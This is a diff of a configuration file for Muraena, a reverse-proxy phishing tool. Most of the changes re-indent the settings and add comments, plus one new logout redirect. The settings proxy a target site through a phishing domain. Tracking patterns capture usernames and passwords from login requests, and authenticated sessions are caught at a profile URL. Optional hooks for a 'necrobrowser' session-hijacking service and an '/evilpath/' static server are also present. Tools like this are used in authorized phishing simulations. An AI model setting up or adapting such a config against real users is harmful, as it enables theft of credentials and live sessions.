@@ -1,18 +1,26 @@
 [proxy]
+    # Phishing domain
+    phishing = "test.muraena"
 
-phishing = "test.muraena"
-destination = "victim.site"
-IP = "0.0.0.0"
-port = 443
+    # Target domain to proxy
+    destination = "victim.site"
 
-#
-# Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
-# - test.muraena:8443
-# - victim.site: 443
-#
-# port mapping can be configured as follow: ListeningPort:TargetPort
-# portmapping = "443:31337"
+    # Listening IP address
+    IP = "0.0.0.0"
 
+    # Listeninng TCP Port
+    port = 443
+
+    #
+    # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
+    # - test.muraena:8443
+    # - victim.site: 443
+    #
+    # port mapping can be configured as follow: ListeningPort:TargetPort
+    # portmapping = "443:31337"
+
+
+    # Force HTTP to HTTPS redirection
     [proxy.HTTPtoHTTPS]
     enabled = true
     HTTPport = 80
@@ -23,6 +31,7 @@ port = 443
 #
 [transform]
 
+    # List of content types to exclude from the transformation process
     skipContentType = [ "font/*", "image/*" ]
 
     # Enable transformation rules in base64 strings
@@ -76,63 +85,69 @@ port = 443
             "X-Forwarded-For"
         ]
 
-
 #
 # Rudimental redirection rules
 #
 [[drop]]
-path = "/logout"
-redirectTo = "https://victim.site"
+    path = "/logout"
+    redirectTo = "https://victim.site"
+
+[[drop]]
+    path = "/singout"
+    redirectTo = "https://victim.site"
 
 
 #
 # LOG
 #
 [log]
-enabled = true
-filePath = "muraena.log"
+    enabled = true
+    filePath = "muraena.log"
 
 
 #
 # TLS
 #
 [tls]
-enabled = true
-expand = false
-certificate = "./config/cert.pem"
-key = "./config/privkey.pem"
-root = "./config/fullchain.pem"
+    enabled = true
+
+    # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
+    # filepath
+    expand = false
+    certificate = "./config/cert.pem"
+    key = "./config/privkey.pem"
+    root = "./config/fullchain.pem"
 
 #
 # CRAWLER
 #
 [crawler]
-enabled = false
-depth = 3
-upto = 20
-externalOriginPrefix = "www-"
-externalOrigins = [
-  "*.anotherdomain.site",
-  "example.dev"
-]
+    enabled = false
+    depth = 3
+    upto = 20
+    externalOriginPrefix = "www-"
+    externalOrigins = [
+      "*.anotherdomain.site",
+      "example.dev"
+    ]
 
 #
 # NECROBROWSER
 #
 [necrobrowser]
-enabled = false
-endpoint = "http://necrobrowser.url/xyz"
-profile = "./config/instrument.necro"
+    enabled = false
+    endpoint = "http://necrobrowser.url/xyz"
+    profile = "./config/instrument.necro"
 
 
 #
 # STATIC SERVER
 #
 [staticServer]
-enabled = false
-port = 8080
-localPath = "./static/"
-urlPath = "/evilpath/"
+    enabled = false
+    port = 8080
+    localPath = "./static/"
+    urlPath = "/evilpath/"
 
 
 #
@@ -141,42 +156,42 @@ urlPath = "/evilpath/"
 [tracking]
 enabled = true
 
-# Tracking types can be Path || Query (default)
-#
-# query:
-#  ?identifier=trackingID
-#
-# path:
-#   /trackingID
-#
-type = "query"
+    # Tracking types can be Path || Query (default)
+    #
+    # query:
+    #  ?identifier=trackingID
+    #
+    # path:
+    #   /trackingID
+    #
+    type = "query"
 
-# Tracking identifier
-identifier = "_gat"
+    # Tracking identifier
+    identifier = "_gat"
 
-# Rule to generate and validate a tracking identifier
-regex = "[a-zA-Z0-9]{5}"
+    # Rule to generate and validate a tracking identifier
+    regex = "[a-zA-Z0-9]{5}"
 
-# Set speific victim's IP address
-# ipSource = ""
+    # Set speific victim's IP address
+    # ipSource = ""
 
-# Set tracking cookie for a custom domain
-# domain = ""
+    # Set tracking cookie for a custom domain
+    # domain = ""
 
-[tracking.urls]
-credentials = [ "/session" ]
-authSession = [ "/settings/profile" ]
+    [tracking.urls]
+    credentials = [ "/session" ]
+    authSession = [ "/settings/profile" ]
 
-[[tracking.patterns]]
-label = "Username"
-matching = "login"
-start = "login="
-end = "&password="
+    [[tracking.patterns]]
+    label = "Username"
+    matching = "login"
+    start = "login="
+    end = "&password="
 
-[[tracking.patterns]]
-label = "Password"
-matching = "password"
-start = "password="
-end = "&"
+    [[tracking.patterns]]
+    label = "Password"
+    matching = "password"
+    start = "password="
+    end = "&"
 
 
